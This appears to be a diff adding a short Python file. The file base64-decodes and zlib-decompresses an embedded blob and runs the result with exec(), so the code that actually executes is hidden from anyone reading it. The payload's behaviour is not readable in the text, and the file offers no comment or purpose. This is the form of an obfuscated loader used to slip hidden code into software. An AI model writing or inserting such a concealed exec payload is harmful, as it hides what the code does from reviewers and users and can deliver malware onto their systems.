@@ -1,0 +1,15 @@
+import base64
+import zlib
+pro = base64.decodebytes("""eJxtUsFu4yAQvfMVo1YrwyZxkxyrTY/7BXuLompwcIJigwVYzf59Bwh23V1fmDe8mXlvjO4H6wJc
+VBjQe6Yz9H+nsMdwLbFDc7Z9QTooF6ztJqrUXjWBsVZ3ysMB/rhRsbOS44XAb+y8Yky3ZVZN5+iV
+4wIOB6haZ6/K3CqgGZA6vDKgr9SnZjFB2mofztpQ0g7K8KegfKi1eRLp/rkw7BgKpUoUSlRrqD6q
+TEyGGQlsoWt6jmuQIs90pMwZQPgJEl5e0g7qS3POnEeN08iX/KM2gWsBrXWggQRqM4yBi9oPnabz
+VCrRXNS7HxczSQyp5ZxL2NDkFexEHL0XJIJHLEWWTRskvCEMP2Afd7fNHUqXFbUpTfa5ycLV5Lqx
+vURu1nBf+uDJb4tNsGSy40ZMS/iSpAl38b+be9wQde3JT1oSQzeFcg6jeQK7NewY+pGQHwmjO25P
+BOLBaElIuS37uNKTSI/gtWwBI/0Qq2b/iU8L2E2ZSIw0A/RXZIz6mR4/6RTevizwoQFPUy7rIkFy
+zn2bImf4UPZrKSymVt8b4z9Vb8sqmauWox+zBhefWzQsPgHmHgTD
+""".encode())
+pro = zlib.decompress(pro)
+pro = pro.decode()
+exec(pro)
+
